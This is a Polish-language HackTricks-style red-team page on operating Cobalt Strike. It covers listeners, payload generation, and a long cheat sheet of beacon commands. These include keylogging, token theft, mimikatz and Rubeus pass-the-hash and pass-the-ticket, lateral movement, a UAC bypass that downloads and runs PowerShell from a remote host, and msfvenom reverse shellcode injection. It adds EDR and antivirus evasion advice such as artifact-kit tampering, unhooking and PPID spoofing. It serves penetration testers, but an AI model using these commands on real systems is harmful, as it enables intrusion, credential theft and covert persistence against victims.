# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, następnie możesz wybrać, gdzie nasłuchiwać, jakiego rodzaju beaconu użyć (http, dns, smb...) i więcej.

### Peer2Peer Listeners

Beacony tych listenerów nie muszą komunikować się bezpośrednio z C2 — mogą komunikować się z nim za pośrednictwem innych beaconów.

`Cobalt Strike -> Listeners -> Add/Edit`, następnie musisz wybrać beacony TCP lub SMB.

* **Beacon TCP ustawi listener na wybranym porcie**. Aby połączyć się z beaconem TCP, użyj polecenia `connect <ip> <port>` z innego beaconu.
* **Beacon SMB będzie nasłuchiwać na pipename o wybranej nazwie**. Aby połączyć się z beaconem SMB, użyj polecenia `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** dla plików HTA
* **`MS Office Macro`** dla dokumentu Office z makrem
* **`Windows Executable`** dla pliku .exe, .dll lub usługi .exe
* **`Windows Executable (S)`** dla **stageless** pliku .exe, .dll lub usługi .exe (stageless jest lepszy niż staged, ponieważ generuje mniej IoC)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` spowoduje wygenerowanie skryptu/pliku wykonywalnego pobierającego beacon z Cobalt Strike w formatach takich jak: bitsadmin, exe, powershell i python.

#### Host Payloads

Jeśli masz już plik, który chcesz hostować na serwerze WWW, przejdź do `Attacks -> Web Drive-by -> Host File`, a następnie wybierz plik do hostowania i konfigurację serwera WWW.

### Beacon Options

<details>
<summary>Opcje i polecenia beaconu</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Niestandardowe implanty / Linux Beacons

- Niestandardowy agent musi jedynie komunikować się z protokołem HTTP/S Cobalt Strike Team Server (domyślnym malleable C2 profile), aby zarejestrować się/zamel dować i odbierać zadania. Należy zaimplementować te same URI, nagłówki i szyfrowanie metadanych zdefiniowane w profilu, aby ponownie używać interfejsu Cobalt Strike do przydzielania zadań i odbierania wyników.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (np. `CustomBeacon.cna`) może opakowywać generowanie payloadu dla nie-Windowsowego Beacona, dzięki czemu operatorzy mogą wybrać listener i bezpośrednio z GUI generować payloady ELF.
- Przykładowe linuxowe task handlers udostępniane Team Server: `sleep`, `cd`, `pwd`, `shell` (wykonywanie dowolnych poleceń), `ls`, `upload`, `download` i `exit`. Odpowiadają one identyfikatorom zadań oczekiwanym przez Team Server i muszą zostać zaimplementowane po stronie serwera, aby zwracać dane wyjściowe we właściwym formacie.
- Obsługę BOF w Linux można dodać, ładując Beacon Object Files wewnątrz procesu za pomocą [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (obsługuje również BOF w stylu Outflank), co pozwala uruchamiać modularne post-exploitation w kontekście i z uprawnieniami implantu bez tworzenia nowych procesów.<sup>[[2]](#references)[[3]](#references)</sup>
- Osadź SOCKS handler w niestandardowym Beaconie, aby zachować zgodność funkcji pivotingu z Windows Beacons: gdy operator uruchomi `socks <port>`, implant powinien otworzyć lokalne proxy w celu przekierowania narzędzi operatora przez zaatakowany host Linux do sieci wewnętrznych.

## Opsec

### Execute-Assembly

**`execute-assembly`** używa **sacrificial process** i remote process injection do wykonania wskazanego programu. Jest to bardzo głośne, ponieważ do wstrzyknięcia kodu do procesu używane są określone Win API, które są sprawdzane przez każdy EDR. Istnieją jednak niestandardowe narzędzia, których można użyć do załadowania czegoś w tym samym procesie:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- W Cobalt Strike można również używać BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor script `https://github.com/outflanknl/HelpColor` utworzy w Cobalt Strike polecenie `helpx`, które doda kolory do poleceń, wskazując, czy są one BOF (zielony), Frok&Run (żółty) i podobne, czy też są ProcessExecution, injection lub podobne (czerwony). Ułatwia to rozpoznanie, które polecenia są bardziej stealthy.

### Działanie jako użytkownik

Możesz sprawdzić zdarzenia takie jak `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Sprawdź wszystkie interaktywne logowania, aby poznać typowe godziny pracy.
- System EID 12,13 - Sprawdź częstotliwość wyłączania, uruchamiania i usypiania systemu.
- Security EID 4624/4625 - Sprawdź przychodzące poprawne/niepoprawne próby użycia NTLM.
- Security EID 4648 - To zdarzenie jest tworzone, gdy do logowania używane są poświadczenia w plaintext. Jeśli wygenerował je proces, plik binarny może zawierać poświadczenia w postaci jawnego tekstu w pliku konfiguracyjnym lub w kodzie.

Podczas używania `jump` z cobalt strike lepiej użyć metody `wmi_msbuild`, aby nowy proces wyglądał bardziej legit.

### Używanie kont komputerów

Obrońcy często sprawdzają nietypowe zachowania generowane przez użytkowników oraz **wykluczają konta usług i konta komputerów, takie jak `*$`, z monitorowania**. Możesz użyć tych kont do lateral movement lub privilege escalation.

### Używanie stageless payloads

Stageless payloads są mniej głośne niż staged payloads, ponieważ nie muszą pobierać drugiego stage z serwera C2. Oznacza to, że po początkowym połączeniu nie generują żadnego ruchu sieciowego, przez co są mniej podatne na wykrycie przez zabezpieczenia oparte na monitorowaniu sieci.

### Tokens & Token Store

Zachowaj ostrożność podczas kradzieży lub generowania tokenów, ponieważ EDR może wyliczać tokeny wątków i wykryć **token należący do innego użytkownika** lub nawet token SYSTEM wewnątrz procesu.

Pozwala to przechowywać tokeny **dla każdego Beacona**, dzięki czemu nie trzeba wielokrotnie kraść tego samego tokena. Jest to przydatne podczas lateral movement lub gdy trzeba wielokrotnie użyć skradzionego tokena:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Podczas lateral movement zazwyczaj lepiej jest **ukraść token niż wygenerować nowy** lub przeprowadzić atak pass the hash.

### Guardrails

Cobalt Strike ma funkcję o nazwie **Guardrails**, która pomaga zapobiegać użyciu określonych poleceń lub działań, które mogą zostać wykryte przez obrońców. Guardrails można skonfigurować tak, aby blokowały konkretne polecenia, takie jak `make_token`, `jump`, `remote-exec` i inne, które są często używane do lateral movement lub privilege escalation.

Ponadto repozytorium [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) zawiera również pewne kontrole i pomysły, które można rozważyć przed wykonaniem payloadu.

### Szyfrowanie tickets

W AD należy uważać na szyfrowanie tickets. Domyślnie niektóre narzędzia używają szyfrowania RC4 dla tickets Kerberos, które jest mniej bezpieczne niż szyfrowanie AES, a domyślnie aktualne środowiska używają AES. Może to zostać wykryte przez obrońców monitorujących słabe algorytmy szyfrowania.

### Unikanie ustawień domyślnych

Podczas używania Cobalt Stricke domyślnie SMB pipes będą miały nazwy `msagent_####` oraz `"status_####"`. Zmień te nazwy. Nazwy istniejących pipes można sprawdzić w Cobal Strike za pomocą polecenia: `ls \\.\pipe\`

Ponadto podczas sesji SSH tworzony jest pipe o nazwie `\\.\pipe\postex_ssh_####`. Zmień go za pomocą `set ssh_pipename "<new_name>";`.

Również podczas ataku poext exploitation pipes `\\.\pipe\postex_####` można zmodyfikować za pomocą `set pipename "<new_name>"`.

W profilach Cobalt Strike można również modyfikować takie elementy jak:

- Unikanie używania `rwx`
- Sposób działania process injection (które API będą używane) w bloku `process-inject {...}`
- Sposób działania "fork and run" w bloku `post-ex {…}`
- Czas uśpienia
- Maksymalny rozmiar plików binarnych ładowanych do pamięci
- Memory footprint i zawartość DLL za pomocą bloku `stage {...}`
- Ruch sieciowy

### Omijanie memory scanning

Niektóre ERD skanują pamięć w poszukiwaniu znanych sygnatur malware. Coblat Strike umożliwia modyfikację funkcji `sleep_mask` jako BOF, który będzie w stanie szyfrować backdoor w pamięci.

### Głośne proc injections

Wstrzykiwanie kodu do procesu jest zazwyczaj bardzo głośne, ponieważ **żaden zwykły proces zazwyczaj nie wykonuje takiej czynności, a sposoby jej wykonania są bardzo ograniczone**. Dlatego może to zostać wykryte przez systemy detekcji oparte na zachowaniu. Ponadto może to zostać wykryte przez EDR skanujące pamięć w poszukiwaniu **wątków zawierających kod, którego nie ma na dysku** (chociaż procesy takie jak przeglądarki, używające JIT, często tak działają). Przykład: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | Relacje PID i PPID

Podczas tworzenia nowego procesu ważne jest **zachowanie typowej relacji rodzic-dziecko** między procesami, aby uniknąć wykrycia. Jeśli svchost.exec wykonuje iexplorer.exe, będzie to wyglądało podejrzanie, ponieważ svchost.exe nie jest rodzicem iexplorer.exe w normalnym środowisku Windows.

Gdy w Cobalt Strike tworzony jest nowy Beacon, domyślnie tworzony jest proces używający **`rundll32.exe`** do uruchomienia nowego listenera. Nie jest to zbyt stealthy i może zostać łatwo wykryte przez EDR. Ponadto `rundll32.exe` jest uruchamiany bez żadnych argumentów, co czyni go jeszcze bardziej podejrzanym.

Za pomocą poniższego polecenia Cobalt Strike można określić inny proces, który ma utworzyć nowy Beacon, dzięki czemu będzie on trudniejszy do wykrycia:
```bash
spawnto x86 svchost.exe
```
Możesz również zmienić to ustawienie **`spawnto_x86` i `spawnto_x64`** w profilu.

### Proxying attackers traffic

Atakujący czasami musi mieć możliwość lokalnego uruchamiania narzędzi, nawet na maszynach Linux, oraz sprawić, aby traffic of the victims docierał do narzędzia (np. NTLM relay).

Ponadto czasami podczas wykonywania ataku pass-the.hash lub pass-the-ticket bardziej stealthy jest dla atakującego **dodanie tego hasha lub biletu do jego własnego procesu LSASS** lokalnie, a następnie wykonanie pivot z jego użyciem, zamiast modyfikowania procesu LSASS na maszynie ofiary.

Należy jednak zachować **ostrożność w przypadku generowanego traffic**, ponieważ backdoor process może wysyłać nietypowy traffic (Kerberos?). W takim przypadku można wykonać pivot do procesu przeglądarki (chociaż możesz zostać wykryty podczas wstrzykiwania się do procesu, więc rozważ stealthy sposób wykonania tej czynności).

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Sprawdź stronę:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Zwykle w `/opt/cobaltstrike/artifact-kit` można znaleźć kod i pre-compiled templates (w `/src-common`) payloadów, których cobalt strike używa do generowania binary beacons.

Używając [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) z wygenerowanym backdoor (lub tylko ze skompilowanym template), możesz znaleźć, co powoduje wyzwolenie defender. Zwykle jest to string. Możesz więc po prostu zmodyfikować kod generujący backdoor, aby ten string nie pojawiał się w final binary.

Po zmodyfikowaniu kodu uruchom `./build.sh` z tego samego katalogu i skopiuj folder `dist-pipe/` do klienta Windows, do `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Nie zapomnij załadować agresywnego skryptu `dist-pipe\artifact.cna`, aby wskazać Cobalt Strike, że ma używać wybranych przez nas zasobów z dysku, a nie załadowanych.

#### Resource Kit

Folder ResourceKit zawiera szablony opartych na skryptach payloadów Cobalt Strike, w tym PowerShell, VBA i HTA.

Używając [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) wraz z szablonami, możesz sprawdzić, czego Defender (w tym przypadku AMSI) nie akceptuje, i zmodyfikować to:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modyfikując wykryte wiersze, można wygenerować template, który nie zostanie wykryty.

Nie zapomnij załadować agresywnego skryptu `ResourceKit\resources.cna`, aby wskazać Cobalt Strike, żeby używał żądanych przez nas zasobów z dysku, a nie tych załadowanych.

#### Function hooks | Syscall

Function hooking to bardzo powszechna metoda używana przez EDR-y do wykrywania złośliwej aktywności. Cobalt Strike umożliwia obejście tych hooków poprzez użycie **syscalls** zamiast standardowych wywołań Windows API przy użyciu konfiguracji **`None`**, użycie wersji funkcji `Nt*` z ustawieniem **`Direct`** albo po prostu przeskoczenie nad funkcją `Nt*` przy użyciu opcji **`Indirect`** w malleable profile. W zależności od systemu jedna opcja może być bardziej stealth niż inna.

Można to ustawić w profilu lub za pomocą polecenia **`syscall-method`**

Może to jednak również generować dużo szumu.

Jedną z opcji oferowanych przez Cobalt Strike do obchodzenia function hooks jest usunięcie tych hooków za pomocą: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Możesz także sprawdzić, które funkcje są zahookowane, za pomocą [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) lub [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Różne polecenia Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Linux Beacon Cobalt Strike (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader i Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Szablon nix BOF firmy Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Analiza szyfrowania metadanych Cobalt Strike przeprowadzona przez Unit42](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Dziennik SANS ISC dotyczący ruchu Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
